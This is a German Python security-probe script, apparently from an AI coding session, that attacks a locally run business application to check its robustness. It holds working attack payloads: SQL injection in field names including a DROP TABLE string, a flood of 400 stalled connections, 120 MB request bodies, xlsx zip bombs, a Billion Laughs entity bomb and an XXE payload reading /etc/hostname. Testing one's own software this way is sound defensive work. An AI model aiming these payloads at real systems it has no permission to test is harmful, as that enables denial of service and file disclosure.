"""Sicherheitsproben Teil 3: Feldnamen-/Typ-Fuzzing, Massenzuweisung, NaN/Infinity, Verbindungsflut, große Anfragen, ZIP-Bomben."""
import json, re, sys, base64, time, io, zipfile, socket, threading, os
exec(open("/tmp/claude-0/t/sec/sec.py").read().split("inh = cl()")[0])
J = lambda t: json.loads(t) if t and t[:1] in "[{" else {}
inh = cl(); rq(inh, "POST", "/api/anmeldung/anmelden", {"login": "jonas", "passwort": "geheim123"})
def A(m, p, d=None, c=None, h=None):
    s, b, hd = rq(c or inh, m, "/api/" + p, d, h); j = J(b)
    if isinstance(j, dict): j["_s"] = s; j["_roh"] = b
    else: j = {"_s": s, "liste": j, "_roh": b}
    return j
def anmelden(login, pw):
    c = cl(); s, b, _ = rq(c, "POST", "/api/anmeldung/anmelden", {"login": login, "passwort": pw}); return c, s
PID = int(os.popen("pgrep -f 'app.py kein-browser' | head -1").read().strip() or 0)
def rss(): 
    try: return int([z for z in open(f"/proc/{PID}/status") if z.startswith("VmRSS")][0].split()[1]) // 1024
    except Exception: return -1
def fds():
    try: return len(os.listdir(f"/proc/{PID}/fd"))
    except Exception: return -1
def threads():
    try: return int([z for z in open(f"/proc/{PID}/status") if z.startswith("Threads")][0].split()[1])
    except Exception: return -1
print("Server-PID", PID, "RSS", rss(), "MB, Threads", threads())
print("\n== 1. Feldnamen-Fuzzing (SQL über Spaltennamen), Typen")
BOESE = {'x"=1,login': 1, "id": 999999, "nummer); DROP TABLE kunden;--": 1, "name=name--": "x", "__class__": {"a": 1}, "rowid": 5}
TYPEN = [None, [], {}, [1, 2], {"a": {"b": 1}}, "x" * 50, -1, 1e308, True, "💥\u0000\ud83d"]
res = ["kunden", "auftraege", "positionen", "belege", "lieferanten", "zahlungen", "termine", "material", "werkzeuge", "mitarbeiter", "zeiten", "abwesenheiten", "briefe", "projekte",
       "wiedervorlagen", "sachkonten", "benutzer", "korrespondenz", "lohn", "materialsets", "notizen", "offeneposten", "mahnungen", "bank", "lager", "stunden", "positionsvorlagen", "kalkvorgaben", "vorlagen",
       "arbeitsschutz/gb", "arbeitsschutz/ba", "arbeitsschutz/themen", "arbeitsschutz/unterweisungen", "arbeitsschutz/qualifikationen", "arbeitsschutz/verbandbuch", "arbeitsschutz/vorsorge", "bautagebuch", "montage", "reste", "nummernkreise", "einstellungen"]
fuenf = {}
for r_ in res:
    for m, p in (("POST", r_), ("PUT", r_ + "/1"), ("PUT", r_ + "/2"), ("PUT", r_)):
        x = A(m, p, BOESE)
        if x["_s"] >= 500: fuenf.setdefault(f"{m} {p}", []).append("Feldnamen: " + x["_roh"][:140])
        for i, t in enumerate(TYPEN):
            try:
                d = {k_: t for k_ in ("name", "kurzname", "bezeichnung", "menge", "einzelpreis", "datum", "betrag", "text", "kunde_id", "auftrag_id", "von", "bis", "nummer", "status", "druck", "preis", "stunden", "mitarbeiter_id", "titel")}
                x = A(m, p, d)
            except Exception as f:
                fuenf.setdefault(f"{m} {p}", []).append(f"Typ {i}: Client-Fehler {f}"); continue
            if x["_s"] >= 500: fuenf.setdefault(f"{m} {p}", []).append(f"Typ {i} ({json.dumps(t)[:20]}): " + x["_roh"][:140])
print("  Anfragen mit HTTP 500:", len(fuenf))
for k_, v in list(fuenf.items())[:40]: print("   ", k_, "|", len(v), "×", v[0][:210])
print("  Kundentabelle noch da:", A("GET", "kunden")["_s"])
print("\n== 2. NaN / Infinity")
k = A("POST", "kunden", {"kurzname": "NaN-Test", "plz": "88069", "ort": "Tettnang"}); a = A("POST", "auftraege", {"kunde_id": k["id"], "bezeichnung": "NaN"})
po = A("POST", f"auftraege/{a['id']}/positionen", {"text": "Pos"}); pid = po.get("id") or po["position"]["id"]
for name, roh in (("Infinity", '{"einzelpreis": Infinity, "preis_manuell": 1, "menge": 1}'), ("NaN", '{"einzelpreis": NaN, "preis_manuell": 1, "menge": 1}'), ("1e999", '{"einzelpreis": 1e999, "preis_manuell": 1, "menge": 1}'), ("Menge 1e308", '{"einzelpreis": 1e300, "preis_manuell": 1, "menge": 1e308}'), ("-0", '{"einzelpreis": -0.0, "preis_manuell": 1, "menge": 1}'), ("1e15", '{"einzelpreis": 1e15, "preis_manuell": 1, "menge": 3}')):
    r = urllib.request.Request(U + f"/api/positionen/{pid}", method="PUT", data=roh.encode(), headers={"Content-Type": "application/json"})
    try: x = inh.open(r); s, t = x.status, x.read().decode()
    except urllib.error.HTTPError as e: s, t = e.code, e.read().decode()
    g = rq(inh, "GET", f"/api/auftraege/{a['id']}")[1]
    streng = True
    try: json.loads(g, parse_constant=lambda c: (_ for _ in ()).throw(ValueError(c)))
    except ValueError as f: streng = f"UNGÜLTIGES JSON ({f})"
    ep = re.findall(r'"einzelpreis": ([^,}]+)', g)[:2]; su = re.findall(r'"(?:netto|summe|gesamt)[a-z_]*": ([^,}]+)', g)[:3]
    print("  %-12s PUT %s %s | Auftrag danach: gültiges JSON: %s | einzelpreis %s Summen %s" % (name, s, t[:60].replace("\n", " "), streng, ep, su))
rq(inh, "PUT", f"/api/positionen/{pid}", {"einzelpreis": 10, "preis_manuell": 1, "menge": 1})
print("\n== 3. Verbindungsflut (offene, stumme Verbindungen)")
t0 = threads(); f0 = fds(); socks = []
for i in range(400):
    try:
        s_ = socket.create_connection(("127.0.0.1", 8799), timeout=5); s_.sendall(b"POST /api/kunden HTTP/1.1\r\nHost: 127.0.0.1:8799\r\nContent-Length: 1000000\r\n"); socks.append(s_)
    except OSError as f: print("  Verbindung", i, "abgelehnt:", f); break
time.sleep(1); z = time.time(); s, _, _ = rq(inh, "GET", "/api/version"); print("  400 stumme Verbindungen offen: Threads %s → %s, offene Dateien %s → %s, Antwort /api/version %s in %.2fs" % (t0, threads(), f0, fds(), s, time.time() - z))
time.sleep(40)
lebend = 0
for s_ in socks:
    try:
        s_.settimeout(0.05); d = s_.recv(1)
        if d == b"": continue
        lebend += 1
    except socket.timeout: lebend += 1
    except OSError: pass
print("  nach 40 s noch offen:", lebend, "von", len(socks), "| Threads", threads())
for s_ in socks: s_.close()
time.sleep(1); print("  nach Schließen: Threads", threads())
print("\n== 4. Große Anfrage durch Benutzer ohne Rechte (Rolle Mitarbeiter)")
mita, _ = anmelden("mita", "Pruefung#2026")
r0 = rss(); gross = b'{"x": "' + b"A" * (120 * 1024 * 1024) + b'"}'
z = time.time()
rr = urllib.request.Request(U + "/api/kunden", method="POST", data=gross, headers={"Content-Type": "application/json"})
try: x = mita.open(rr, timeout=120); s = x.status
except urllib.error.HTTPError as e: s = e.code
print("  120 MB an /api/kunden als Mitarbeiter: HTTP %s in %.1fs, Arbeitsspeicher Server %s → %s MB (Spitze nicht gemessen)" % (s, time.time() - z, r0, rss()))
anon = cl(); z = time.time()
rr = urllib.request.Request(U + "/api/kunden", method="POST", data=gross[:30 * 1024 * 1024], headers={"Content-Type": "application/json"})
try: x = anon.open(rr, timeout=120); s = x.status
except urllib.error.HTTPError as e: s = e.code
except Exception as f: s = f"Abbruch ({type(f).__name__})"
print("  30 MB ohne Anmeldung: %s in %.1fs, RSS %s MB" % (s, time.time() - z, rss()))
del gross
print("\n== 5. ZIP-Bomben in den Importen")
def xlsx_bombe(mb):
    puffer = io.BytesIO()
    with zipfile.ZipFile(puffer, "w", zipfile.ZIP_DEFLATED) as z_:
        z_.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        z_.writestr("xl/workbook.xml", '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="A" sheetId="1" r:id="rId1"/></sheets></workbook>')
        z_.writestr("xl/_rels/workbook.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>')
        zeile = '<row><c t="inlineStr"><is><t>' + "A" * 900 + '</t></is></c></row>'
        z_.writestr("xl/worksheets/sheet1.xml", '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>' + zeile * (mb * 1024 * 1024 // len(zeile)) + '</sheetData></worksheet>')
    return puffer.getvalue()
for mb in (50, 300):
    b_ = xlsx_bombe(mb); r0 = rss(); z = time.time()
    spitze = [r0]; stop = []
    def mess():
        while not stop: spitze.append(rss()); time.sleep(0.05)
    th = threading.Thread(target=mess, daemon=True); th.start()
    x = A("POST", "preisimport/lesen", {"daten": base64.b64encode(b_).decode(), "dateiname": "bombe.xlsx"})
    stop.append(1); th.join()
    print("  Preisimport xlsx %d KB gepackt → %d MB entpackt: HTTP %s %s | %.1fs | RSS %s → Spitze %s MB" % (len(b_) // 1024, mb, x["_s"], str(x.get("fehler", ""))[:90], time.time() - z, r0, max(spitze)))
    r0 = rss(); z = time.time(); spitze = [r0]; stop = []
    th = threading.Thread(target=mess, daemon=True); th.start()
    x = A("POST", "kunden/import", {"daten": base64.b64encode(b_).decode(), "dateiname": "bombe.xlsx"})
    stop.append(1); th.join()
    print("  Kundenimport dieselbe Datei: HTTP %s %s | %.1fs | RSS %s → Spitze %s MB" % (x["_s"], str(x.get("fehler", ""))[:90], time.time() - z, r0, max(spitze)))
# XML-Entitäten (Billion Laughs) im Kontoauszug
lol = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">' + "".join(f'<!ENTITY lol{i} "{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}{"&lol" + (str(i - 1) if i > 1 else "") + ";"}">' for i in range(1, 10)) + ']><Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02"><BkToCstmrStmt><Stmt><Id>&lol9;</Id></Stmt></BkToCstmrStmt></Document>'
r0 = rss(); z = time.time(); x = A("POST", "bank/einlesen", {"daten": base64.b64encode(lol.encode()).decode(), "dateiname": "lol.xml"}); print("  Kontoauszug mit Entitäten-Lawine: HTTP %s %s | %.1fs | RSS %s → %s" % (x["_s"], str(x.get("fehler", ""))[:120], time.time() - z, r0, rss()))
xxe = '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/hostname">]><Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02"><BkToCstmrStmt><Stmt><Id>&x;</Id><Acct><Id><IBAN>DE02120300000000202051</IBAN></Id></Acct></Stmt></BkToCstmrStmt></Document>'
x = A("POST", "bank/einlesen", {"daten": base64.b64encode(xxe.encode()).decode(), "dateiname": "xxe.xml"}); print("  Kontoauszug mit externer Entität: HTTP %s %s" % (x["_s"], x["_roh"][:160]))
print("Server lebt:", rq(inh, "GET", "/api/version")[0], "RSS", rss())
